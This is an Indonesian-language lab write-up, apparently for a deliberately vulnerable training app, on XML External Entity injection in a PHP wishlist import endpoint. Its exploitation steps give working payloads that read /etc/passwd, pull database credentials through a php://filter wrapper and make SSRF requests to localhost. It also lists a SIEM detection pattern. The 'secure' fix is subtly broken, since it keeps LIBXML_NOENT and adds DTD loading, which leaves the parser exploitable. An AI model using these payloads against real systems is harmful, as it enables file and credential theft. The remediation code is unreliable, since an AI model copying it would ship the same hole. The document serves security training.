# XXE — XML External Entity Injection

## Deskripsi
XXE terjadi ketika XML parser memproses external entity references yang disuntikkan attacker. Bisa digunakan untuk membaca file lokal, melakukan SSRF, atau dalam kasus tertentu mencapai RCE.

**Severity:** High  
**OWASP:** A05:2021 — Security Misconfiguration

## Endpoint Vulnerable
- `POST /public/wishlist_import.php` — file XML diparse dengan `LIBXML_NOENT` tanpa disable external entities

## Langkah Eksploitasi

### Basic XXE — Baca /etc/passwd
1. Buat file `xxe_payload.xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE wishlist [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<wishlist>
  <item>
    <name>&xxe;</name>
    <price>0</price>
  </item>
</wishlist>
```

2. Upload via `/public/wishlist_import.php`

3. Isi `/etc/passwd` tampil di kolom "Nama Produk"

### XXE — Baca source code PHP
```xml
<!DOCTYPE wishlist [
  <!ENTITY src SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config/database.php">
]>
<wishlist>
  <item>
    <name>&src;</name>
    <price>0</price>
  </item>
</wishlist>
```
→ Output: base64-encoded source code database.php (berisi credentials!)

### XXE → SSRF
```xml
<!DOCTYPE wishlist [
  <!ENTITY ssrf SYSTEM "http://127.0.0.1:8081/">
]>
<wishlist>
  <item>
    <name>&ssrf;</name>
    <price>0</price>
  </item>
</wishlist>
```

## Expected Output
- Isi file `/etc/passwd` muncul di tabel hasil import
- Database credentials terekspos via base64 decode
- Response internal service ter-fetch via XXE-SSRF chain

## SIEM Alert
Rule: `XXE` (Phase 2)  
Pattern: `<!ENTITY`, `SYSTEM`, `PUBLIC`, `<!DOCTYPE` di body POST request

## Cara Fix (Secure Mode)
```php
// Nonaktifkan external entities SEBELUM parsing
libxml_disable_entity_loader(true);
// Atau gunakan flag:
$xml = simplexml_load_string($content, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET);
// LIBXML_NONET: larang network access di XML
// Lebih aman: pakai DOM dengan entity resolution disabled
$dom = new DOMDocument();
$dom->loadXML($content, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
```

## Attack Chain
- **XXE + File Read → Credential Leak**: Baca database.php → dapat DB credentials
- **XXE + SSRF**: Gunakan XXE untuk akses internal network
- **XXE + PHP Wrapper + Base64**: Bypass binary file read restriction
